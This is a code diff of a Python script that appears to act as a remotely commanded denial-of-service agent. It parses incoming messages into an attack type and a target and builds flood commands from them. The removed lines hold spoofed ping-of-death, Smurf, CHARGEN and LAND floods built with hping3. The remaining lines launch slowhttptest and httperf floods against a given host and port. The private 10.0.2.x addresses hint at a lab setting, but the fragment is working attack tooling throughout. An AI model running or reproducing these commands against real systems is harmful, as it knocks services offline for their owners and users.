@@ -51,15 +51,7 @@ def main():
             os.setpgid(os.getpid(), os.getpid())
             seglist = data.decode().split('_')
 
-            if seglist[0][:3] == 'POD':
-                cmd = f"ping {seglist[1]} -s 65000 -i 0.000000001"
-            elif seglist[0][:5] == 'SMURF':
-                cmd = f"hping3 10.0.2.255 -a {seglist[1]} --icmp -C 8 -D --flood"
-            elif seglist[0][:7] == 'CHARGEN':
-                cmd = f"hping3 10.0.2.255 -a {seglist[1]} -p 19 --udp -D --flood"
-            elif seglist[0][:4] == 'LAND':
-                cmd = f"for i in {{1..100000}}; do hping3 {seglist[1]} -a {seglist[1]} -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;"
-            elif seglist[0][:8] == 'SLOWHTTP':
+            if seglist[0][:8] == 'SLOWHTTP':
                 cmd = f"slowhttptest -H -u http://{seglist[1]}:{seglist[2]} -t GET -c 500 -r 30 -p 20 -l 3600"
             elif seglist[0][:8] == 'FASTHTTP':
                 cmd = f"httperf --server {seglist[1]} --port {seglist[2]} --uri / --num-conns 10000 --rate 500"
